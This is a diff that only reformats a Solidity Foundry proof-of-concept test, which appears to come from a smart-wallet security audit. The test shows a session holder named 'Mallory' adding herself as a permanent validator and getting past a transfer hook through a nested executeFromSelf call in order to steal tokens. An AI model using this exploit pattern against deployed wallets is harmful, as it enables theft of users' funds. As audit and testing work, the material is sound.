@@ -74,7 +74,9 @@ contract BypassPoC is Base {
             signature: ""
         });
 
-        bytes32 hash = IExecutor(_alice).getSessionTypedHash(unrestrictedSession);
+        bytes32 hash = IExecutor(_alice).getSessionTypedHash(
+            unrestrictedSession
+        );
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, hash);
         unrestrictedSession.signature = abi.encodePacked(r, s, v);
 
@@ -86,7 +88,11 @@ contract BypassPoC is Base {
         calls[0] = Call({
             target: _alice,
             value: 0,
-            data: abi.encodeWithSignature("addValidator(address,bytes)", address(_ecdsaValidatorImpl), malloryInitArgs)
+            data: abi.encodeWithSignature(
+                "addValidator(address,bytes)",
+                address(_ecdsaValidatorImpl),
+                malloryInitArgs
+            )
         });
 
         // Mallory executes the call. The wallet's onlySelf check will pass because
@@ -95,11 +101,16 @@ contract BypassPoC is Base {
         IWalletCore(_alice).executeFromExecutor(calls, unrestrictedSession);
 
         // Verify that Mallory's new validator is now authorized in the wallet's storage
-        address malloryValidator = IValidation(_alice).computeValidatorAddress(address(_ecdsaValidatorImpl), malloryInitArgs);
+        address malloryValidator = IValidation(_alice).computeValidatorAddress(
+            address(_ecdsaValidatorImpl),
+            malloryInitArgs
+        );
         IStorage storageContract = IWalletCore(_alice).getMainStorage();
         storageContract.validateValidator(malloryValidator);
 
-        console.log("Mallory successfully added herself as a permanent validator!");
+        console.log(
+            "Mallory successfully added herself as a permanent validator!"
+        );
     }
 
     /**
@@ -114,7 +125,11 @@ contract BypassPoC is Base {
         callsDirect[0] = Call({
             target: address(mockToken),
             value: 0,
-            data: abi.encodeWithSignature("transfer(address,uint256)", mallory, 100 ether)
+            data: abi.encodeWithSignature(
+                "transfer(address,uint256)",
+                mallory,
+                100 ether
+            )
         });
 
         // Direct attempt is correctly blocked by the MockHook
@@ -145,14 +160,21 @@ contract BypassPoC is Base {
         innerCalls[0] = Call({
             target: address(mockToken),
             value: 0,
-            data: abi.encodeWithSignature("transfer(address,uint256)", mallory, 100 ether)
+            data: abi.encodeWithSignature(
+                "transfer(address,uint256)",
+                mallory,
+                100 ether
+            )
         });
 
         Call[] memory callsBypass = new Call[](1);
         callsBypass[0] = Call({
             target: _alice,
             value: 0,
-            data: abi.encodeWithSignature("executeFromSelf((address,uint256,bytes)[])", innerCalls)
+            data: abi.encodeWithSignature(
+                "executeFromSelf((address,uint256,bytes)[])",
+                innerCalls
+            )
         });
 
         // Mallory executes the bypass. The wallet's onlySelf check on executeFromSelf passes.
@@ -161,6 +183,8 @@ contract BypassPoC is Base {
 
         // Verification: Mallory successfully stole 100 MTK
         assertEq(mockToken.balanceOf(mallory), 100 ether);
-        console.log("Mallory successfully bypassed onlySelf and transferred 100 MTK!");
+        console.log(
+            "Mallory successfully bypassed onlySelf and transferred 100 MTK!"
+        );
     }
 }
